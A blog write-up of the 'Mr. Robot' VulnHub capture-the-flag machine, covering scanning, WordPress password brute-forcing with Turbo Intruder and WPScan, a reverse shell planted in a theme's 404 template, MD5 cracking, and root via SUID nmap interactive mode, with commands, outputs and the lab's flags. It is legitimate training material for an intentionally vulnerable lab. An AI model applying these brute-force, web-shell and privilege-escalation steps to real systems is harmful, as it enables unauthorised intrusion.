---
layout: post
title: "Mr. Robot"
---

In this writeup, I will cover an awesome machine from the VulnHub - [Mr.Robot](https://www.vulnhub.com/entry/mr-robot-1,151/).  
There is also a version of that machine on TryHackMe! 

## Description:
>Based on the show, Mr. Robot.

>This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.

>The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.

## Content:
* Information gathering
* Brute force
  * Burp Suite
  * WPScan
  * Bonus
* Exploitation
* Privilege escalation
* Conclusion

## Information gathering
The machine itself distributed inside of VM container as a .ova file. You will see the login screen, but the author not mentioned credentials in a description. Let's look around and scan the network:

~~~
netdiscover -i eth0 -r 192.168.159.0/24
~~~

My Kali host has the IP 192.168.159.128 and Mr.Robot machine has 192.168.159.129.
Scanning open ports on Mr.Robot machine:
```
root@kali:~# nmap -sV 192.168.159.129
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```
Opening the IP in a browser, yeah, it is stylized for Mr.Robot TV series website. Fancy, but useless.
Scanning this IP with Nikto:
```
root@kali:~# nikto -h 192.168.159.128
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site differently to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names.
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: ; rel=shortlink
+ /readme.html: This WordPress file reveals the installed version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A WordPress installation was found.
+ /wp-admin/wp-login.php: WordPress login found
+ /blog/wp-login.php: WordPress login found
+ /wp-login.php: WordPress login found
```
Checking the findings I have discovered few interesting pages as */readme.html*, */license.txt*, */wp-login.php* and */robots.txt*.
Let's start from the */robots.txt*:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Let's open this path in a browser or simple WGET it from the terminal:
```
073403c8a58a1f80d943455fb30724b9
```
Hooray! We have found the easiest flag. Moving forward.
Let's have a look on the *fsocity.dic* file. Looks like a wordlist:
```
root@kali:~# head fsocity.dic
true
false
wikia
from
the
now
Wikia
extensions
scss
window
```
This wordlist contains a lot of duplicates, we need to remove them to speed up the process of brute force attack.
```
cat fsocity.dic | sort -u | uniq > newfsocity.dic
```
Now the list contains only 11k words instead of 800k+, it will save a lot of time.
The page */wp-login.php* looks like the right place applies this list.
According to the *readme.html* the system is running WordPress Version 4.3.9

## Brute force
### Burp suite
There are plenty of tools designed for brute force attack, I will breathily cover a few of them as a bonus.
During my walkthrough, I used [TurboIntruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) for the Burp Suite. Incredible fast way to get into the web application.
Just intercept the login command in Burp, double click on the password and choose "Send to turbo intruder".
In this case the value of the password will be automatically replaced by *%s* symbol and the tool will do the rest.
```
POST /wp-login.php HTTP/1.1
Host: 192.168.159.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.159.129/wp-login.php?loggedout=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Cookie: s_fid=0F6464DBC5078D64-2082C0564C7815D5; s_nr=1571217063697; wp-settings-6=libraryContent%3Dbrowse; wp-settings-time-6=1571317217; s_cc=true; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
Connection: close
Upgrade-Insecure-Requests: 1
log=elliot&pwd=%s&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.159.129%2Fwp-admin%2F&testcookie=1
```
As the whole machine have a "Mr.Robot flavor", my first guess was to try "Elliot" as a username.
After a tuning a turbo intruder a bit  I had a password in my hand:
```
ER28-0652
```
### WPScan
As is this machine we are working with WordPress, it's a good idea to use some tools designed exactly for it.
[WPScan](https://wpscan.org/) is a free black box WordPress vulnerability scanner already preinstalled in Kali.
Firing it up and take a coffee break, it will take a while.
```
root@kali:~# wpscan --url 192.168.159.129 --wordlist ./newfsocity.dic --username elliot
---
[+] [SUCCESS] Login : elliot Password : ER28-0652
+----+--------+------+-----------+
| Id | Login  | Name | Password  |
+----+--------+------+-----------+
|    | elliot |      | ER28-0652 |
+----+--------+------+-----------+
```
We already have admin credentials, but let's also check possible vulnerability's here:
```
root@kali:~# wpscan -u 192.168.159.129 -e vp
```
We will have a huge list of possible Cross-Site Scripting, but nothing that will help us exploit the system even more.

### Bonus
Let's have a look at the /license.txt:
```
hat you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?


do you want a password or something?


ZWxsaW90OkVSMjgtMDY1Mgo=
```
Huh, interesting. Looks like a password encoded in base64:
```
root@kali:~# echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 --decode
elliot:ER28-0652
```
Perfect! You don't need to even brute force anything if the information gathering stage was done properly.  
Using these credentials we can log in into the admin panel at */wp-login* page.

## Exploitation
From that point there are a lot of attack vectors, for example, you can craft malicious plugin and install it, or get the data from the database,
We will follow the probably easiest way - [RCE](https://www.bugcrowd.com/glossary/remote-code-execution-rce/)
An example of PHP reverse shell can be found of [PentestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), for example.
From the admin panel in */wp-admin* page we can edit any template files, the first in a list is "404 Template", so we will use that.
Just put the code from PentestMonkey's to the editor and tweak IP and port to yours.
On your host open the terminal and set up a listener to catch the shell when it will be triggered:
```
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
```
Open a 404.php page in a browser or trigger it by curl from your terminal:
```
root@kali:~# curl http://192.168.159.129/404.php
```
If the IP and port were set up properly, you will have a response in a terminal:
```
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ whoami
daemon
$ hostname
linux
```
Hooray! You are in. Look around and open */home/robot* folder:
```
root@kali:~# cd /home/robot
```
There are two files there, *key-2-of-3.txt* and *password.raw-md5*.
To be able to login to the robot session we heed to have a [TTY shell](https://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con).
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
The second flag is very close, but you have a shell as daemon user, who don't have the access to this file.
Luckily you have a hash of the password nearby, open any tool for decoding MD5, for example [MD5Online](https://www.md5online.org/md5-decrypt.html), and decode it:
```
Found : abcdefghijklmnopqrstuvwxyz
(hash = c3fcd3d76192e4007dfb496cca67e13b)
```
Going back to the terminal with the reverse shell in it:
```
$ su - robot
su - robot
Password: abcdefghijklmnopqrstuvwxyz

$ whoami
whoami
robot
```
Now we are logged in as a robot user and we can open *key-2-of-3.txt*:
```
$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```
The second key is
```
822c73956184f694993bede3eb39f959
```
Let's try to get the root! We will need to do a [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation) for that.
First of all, we will check for any files that have the [SUID](https://www.linuxnix.com/suid-set-suid-linuxunix/) set files:
```
$  find / -perm -4000 2>/dev/null
 find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
$
```
Interesting, the nmap is installed. Checking for a version:
```
robot@linux:/$ /usr/local/bin/nmap --version
/usr/local/bin/nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```
The old version of nmap will allow you to use "interactive" mode. In this mode, you can execute the commands from nmap's shell.
The moment of truth:
```
$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
cd /root
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
Well done, we have the last flag now:
```
04787ddef27c3dee1ee161b21670b4e4
```
## Conclusion
It was a robust entry-level machine with classic exploitation flow. Recommending it for beginners, there are at least a few good learning points if you are not very experienced yet.  
